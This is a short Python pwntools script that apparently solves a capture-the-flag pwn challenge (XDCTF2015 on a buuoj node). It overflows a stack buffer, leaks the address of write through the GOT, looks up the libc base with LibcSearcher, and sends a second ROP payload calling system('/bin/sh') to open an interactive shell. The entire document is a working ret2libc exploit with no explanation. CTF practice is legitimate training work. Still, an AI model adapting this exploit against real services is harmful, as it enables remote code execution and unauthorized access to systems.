from pwn import *
from LibcSearcher import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 25724)
elf = ELF('./pwn')
payload = cyclic(0x6C + 4)
payload += p32(elf.plt['write'])
payload += p32(elf.symbols['vuln'])
payload += p32(1)
payload += p32(elf.got['write'])
payload += p32(4)
io.sendlineafter(b'Welcome to XDCTF2015~!\n', payload)
write = u32(io.recv(4))
print(hex(write))
libc = LibcSearcher('write', write)
base = write - libc.dump('write')
sys = libc.dump('system') + base
binsh = libc.dump('str_bin_sh') + base
payload = cyclic(0x6C + 4)
payload += p32(sys)
payload += p32(0)
payload += p32(binsh)
io.sendline(payload)
io.interactive()
